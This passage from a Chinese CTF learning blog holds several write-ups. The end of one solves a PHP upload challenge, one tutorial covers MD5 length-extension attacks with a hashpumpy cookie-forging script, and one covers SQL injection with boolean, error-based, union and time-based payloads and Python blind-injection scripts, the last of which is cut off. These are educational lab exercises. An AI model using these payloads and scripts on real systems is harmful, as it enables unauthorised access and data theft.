class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           <span class="title function_ invoke__">fwrite</span>(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; <span class="title function_ invoke__">floatval</span>(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = False;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = True;</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先得拿到一个admin的session id不能太大,否则数据库拿不出来,但是floatval($_GET[id])!=='1',末尾要求是'9',所以设置id=1%009,这里%00会被mysql_real_escape_string给转成\0,然后\0在mysql里面跑的话似乎是会被识别为字符串的结尾的 给几个图你们体会一下 <img src="/images/2018/01/3.png" alt="blacsheep" /> <img src="/images/2018/01/4.png" alt="blacsheep" /> <img src="/images/2018/01/5.png" alt="blacsheep" /> <img src="/images/2018/01/6.png" alt="blacsheep" /> 所以这里可以取出数据来 然后就是第二关的上传了 上传那里最坑的是backup目录是个假目录,所以用../会跳一层,这里测试了一下(因为我菜啊..),是可以得到执行的,比如 <img src="/images/2018/01/7.png" alt="blacsheep" /> 即使假目录不存在,会跳一下还是可以写入文件的,然后就是正则匹配,正则匹配总是匹配最后一个,所以最后我们用一个解析漏洞,传一个123.php/. 然后getshell,拿到flag okok,剩下的内容几乎每一个都可以写一篇博客了.....慢慢整理吧....</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>md5长度扩展攻击</title>
      <link href="/2017/12/10/md5%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2017/12/10/md5%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>上学期本来看过一些长度扩展攻击的东西的,但是时间过了太久了都忘得差不多了.近期刷题恰好又刷到一道md5长度扩展的题,正好总结一下. 我们先了解一下md5加密流程: 参考链接:<a href="http://blog.csdn.net/syh_486_007/article/details/51228628">传送门</a></p><h3 id="首先对长度进行填充和分组">首先对长度进行填充和分组</h3><p>填充是把数据变成512*N+448位的形式,比如如果长度小于448,那么直接补成448位;如果长度大于448位小于512位,就补充成512+448位这种。 <strong>填充方法</strong>:在消息后面加个1然后无限补0,16进制就是补个80然后无限补0直到448位。 填充完之后前面每组512位,最后一组448位,即56个字节。第57个字节是补位之前的消息长度,后面继续补0直到64字节.就比如下图 <img src="/images/2017/12/1.png" /> abc三个字母,即3字节,24位,十六进制是0x18,所以填个18,后面补0x00.</p><h3 id="然后">然后</h3><p>完成上述过程之后就是获取一个链变量,然后和这个链变量一起进行一波复杂运算(这里不管) 这个链变量一开始是定值,后面的链变量都是上一个块运算得到的结果.</p><h3 id="最后">最后</h3><p>获得最后一次消息的摘要之后进行一个高低位互换即可获得md5。</p><h2 id="md5长度扩展攻击">md5长度扩展攻击</h2><p>md5长度扩展攻击是什么呢?它的实质就是构造明文控制加盐哈希,比如我前面构造和已经补位了的块完全相同的块,那么我第一部分获得的链变量就是相同的,如果我用这个链变量来后续处理我自己添加的字符串,那我是不是就可以在你的hash后面加东西了. <strong>举个例子</strong>: 本来一个字符串<span class="math inline">\(a=&quot;test&quot;,0x74657374 我构造一个字符串\)</span>str1: 0x746573748000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000002000000000000000 如果我们知道"test"的hash值,那么这个部分计算出来的值我们是知道的,因为"test"运算的时候也要补位 补位的操作和我们手动的操作是一致的,所以结果是一样的,但是不同的是,我们对字符串后面加了我们自己要添加的东西,比如 0x746573748000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000002000000000000000746573748 这个时候字符串大于512位,所以计算的时候会先补位位1024位,如下 <span class="math inline">\(str=0x7465737480000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000020000000000000007465737480000 00000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000002002000000000000 计算的时候先算 0x746573748000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000002000000000000000 前面这个部分的链变量为: A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 那么后面的运算用这个部分的链变量来计算即可 0x746573748000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000002002000000000000 通过这种方式,假如我们知道md5(\)</span>salt.<span class="math inline">\(msg1)的值,知道\)</span>salt长度,那么我们就可以获得md5(<span class="math inline">\(salt.\)</span>msg1.<span class="math inline">\(padding.\)</span>hack_content)的值。 在使用长度扩展攻击的时候可以使用hashpump工具,或者是python的hashpumpy库(自行pip安装) 然后我们本地实验一下(自行去掉换行,这里为了美观)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret</span>=<span class="string">&quot;12345&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&quot;admin&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$secret</span>.<span class="string">&#x27;admin%80%00%00%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00P%00%00%00%00%00%00%00newadmin&#x27;</span>)));</span><br></pre></td></tr></table></figure><p>得到结果为 <img src="/images/2017/12/4.png" /> 然后使用hashpump工具得到的结果如图 <img src="/images/2017/12/3.png" /> 所以工具是可以信赖的(hhhh,测试一下嘛...) 具体可以看下面两道题</p><h4 id="第一题">第一题</h4><p>实验吧的一道题-让我进去 <a href="http://ctf5.shiyanbar.com/web/kzhan.php">传送门</a> 首先cookie的source改成1看源码,然后发现要让cookie的getmein的值为md5(salt+username+password) 然而salt值我们不知道,然后题目给出了salt长度为15,并且给出了md5(salt+"admin"+"admin"),但是要求getmein不能为这个已经给出的hash,所以这是一道非常经典的长度扩展攻击的题目,通过给出的hash和salt长度,构造出md5(salt+已知值+padding+控制值). 具体工具使用 <img src="/images/2017/12/2.png" /> 其中签名是已知hash,然后inputdata是后面密码那个admin,长度是前面的salt+username的admin共计20 然后假设加上padding,然后自己控制数据为blacsheep,那么我们就可以获得flag了. 我们的username填admin,然后密码填admin%80%00%00%00%00%00%00%00%00%00%00%00 %00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00 %00%00%00blacsheep cookie的getmein填fd9b223a9c562017f65eaf824f3ca8dd 如图<img src="/images/2017/12/5.png" /></p><h4 id="第二题">第二题</h4><p>Jarvis的一道题-flag在管理员手里 首先index.php~源码泄漏,vim -r恢复一下 得到源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        background:gray;</span><br><span class="line">        text-align:center;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> </span><br><span class="line">        <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">        <span class="variable">$salt</span> = </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$role</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]);</span><br><span class="line">            <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">&quot;admin&quot;</span> </span><br><span class="line">                &amp;&amp; <span class="variable">$hsh</span> === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]))) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$role</span>);</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;role&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">            <span class="variable">$hsh</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$s</span>));</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;hsh&#x27;</span>,<span class="variable">$hsh</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下源码:首先cookie里面的role要为"admin"的序列化值 而cookie里面的hsh要为md5(salt+"admin"的序列化值的倒序) 而目前我们已经有了md5(salt+"guest"的序列化的倒序) 不过我们并不知道salt的长度 这里需要暴力跑一下. 整理一下条件 我们已知条件 md5(salt+<strong>;"tseug":5:s</strong>)为3a4727d57463f122833d9e732f94e4e0 要求md5(salt+<strong>;"nimda":5:s</strong>) 但实际上,反序列化是存在一个小漏洞的,比如 <img src="/images/2017/12/6.png" /> 反序列化到分号就停止了 所以这里我们只用把自定义数据改成<strong>;"nimda":5:s</strong> 所以我们实际上是求md5(salt+<strong>;"tseug":5:s</strong>+padding+<strong>;"nimda":5:s</strong>) 本来长度扩展攻击放在最后的一段数据因为反向到前面,又因为反序列化的小漏洞,直接返回了admin 由这些就可以拿到flag了 所以我们写个脚本实验一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    role = &#123;<span class="string">&#x27;role&#x27;</span>:<span class="string">&#x27;s%3a5%3a&quot;admin&quot;%3b%00%00%00%00%00%00%00%c0%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00%80s%3a5%3a&quot;guest&quot;%3b&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;hsh&#x27;</span>:hashpumpy.hashpump(<span class="string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span>,<span class="string">&#x27;;&quot;tseug&quot;:5:s&#x27;</span>,<span class="string">&#x27;;&quot;nimda&quot;:5:s&#x27;</span>,i)[<span class="number">0</span>]&#125;</span><br><span class="line">    <span class="built_in">print</span>(role)</span><br><span class="line">    r=requests.get(<span class="string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span>,cookies=role)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Wel&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>然后运行结果 <img src="/images/2017/12/7.png" /> 这就拿到flag了 <strong>避免md5长度扩展攻击的方法就是md5(salt+md5(input))</strong></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入学习(加mctf小总结)</title>
      <link href="/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
      <url>/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>供cnss交流会课后学习 前排提醒!本文python脚本因为美观都换了行,自己利用的时候自行修改 首先源码丢了github <a href="https://github.com/blacsheep/sql-injection-practice">传送门</a> 直接正文</p><h3 id="cnss那道题">cnss那道题</h3><p>详情见我博客cnss招新pentest一文</p><h3 id="cnss盲注初体验">cnss盲注初体验</h3><p>首先用户名出输入admin' or '1'='1'# 返回页面: <img src="/images/2017/11/cnss-1.png" /> 再加上页面不会返回数据库的内容,所以考虑盲注(延时也可以,但是返回会不准确,毕竟影响因素多) <strong>首先</strong>我们尝试去爆表: 帐号:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or ascii(substr((select group_concat(table_name) </span><br><span class="line">from information_schema.tables where table_schema=database()),1,1))=48#</span><br></pre></td></tr></table></figure><p>密码随意 如果返回的不为密码错误,就说明后面的表达式是成立的,由此判断出第一个表的第一个字符,通过改变substr 的第二个参数来获取完整表名,通过改limit来获取其他表(或者group_concat也可以,这里用的group_concat) 然后获得表名cnss,flag,user 然后同样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or ascii(substr((select group_concat(column_name) </span><br><span class="line">from information_schema.columns where table_name=&quot;flag&quot;),1,1))=48#</span><br></pre></td></tr></table></figure><p>得到列名为flag 最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or ascii(substr((select flag from flag),1,1))=48#</span><br></pre></td></tr></table></figure><p>脚本样例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">list1=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\&#x27; or ascii(substr((select group_concat(table_name) </span></span><br><span class="line"><span class="string">from information_schema.tables </span></span><br><span class="line"><span class="string">where table_schema=database()),&#123;num&#125;,1))=&#123;ascii1&#125;#&#x27;</span>.<span class="built_in">format</span>(num=num,ascii1=<span class="built_in">ord</span>(each)),</span><br><span class="line">               <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123321&#x27;</span>&#125;</span><br><span class="line">        <span class="comment">#print(data)                       </span></span><br><span class="line">        r=requests.post(<span class="string">&#x27;http://localhost:8080/CNSS/bool.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(each,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到flag:CNSS{SQl_1njecti0n}</p><h3 id="cnss报错注入初体验">cnss报错注入初体验</h3><p>报错注入的前提是目标开启了错误显示,比如我们帐号输入admin',得到返回 <img src="/images/2017/11/cnss-2.png" /> 那么我们输入 帐号:admin' and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))# 密码:随意 得到回显 <img src="/images/2017/11/cnss-3.png" /> 说明有cnss,flag,user三张表,然后同盲注爆出列和字段 <img src="/images/2017/11/cnss-4.png" /> 这里提一个报错注入新姿势,如果知道列名想爆出当前表名,可以使用polygon,比如 <img src="/images/2017/11/cnss-5.png" /></p><h3 id="cnss-union注初体验">cnss union注初体验</h3><p>union注入一般用于有回显的地方,直接用union提取出所需要的信息(还可以用于登录时改变密码,后续会提到) 比如我们的union.php里面 <img src="/images/2017/11/cnss-6.png" /> 所以我们直接用union提取信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">99&#x27; union select group_concat(table_name) from</span><br><span class="line"> information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure><p>返回为<img src="/images/2017/11/cnss-7.png" /> 后面同盲注的提取方法即可</p><h3 id="cnss延时注入初体验">cnss延时注入初体验</h3><p>延时注入适用的范围很广,主要目标没有过滤函数,而且sql语句得到了执行,那么就可以得到判断 举个栗子<img src="/images/2017/11/cnss-8.png" /> 这种就可以延时注入 利用if,if(条件,条件为真的返回,条件为假的返回) 所以我们可以在if里面用盲注的方法来获取信息,但是注意,所得答案可能会受网速影响,多试几次是没问题的 代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">list1=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select group_concat(table_name)</span></span><br><span class="line"><span class="string">              from information_schema.tables where table_schema=database()</span></span><br><span class="line"><span class="string">              ),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(3),1)#&#x27;.format(num=num,ascii1=ord(each))&#x27;&#x27;&#x27;</span>&#125;</span><br><span class="line">        <span class="comment">#print(data)                          </span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            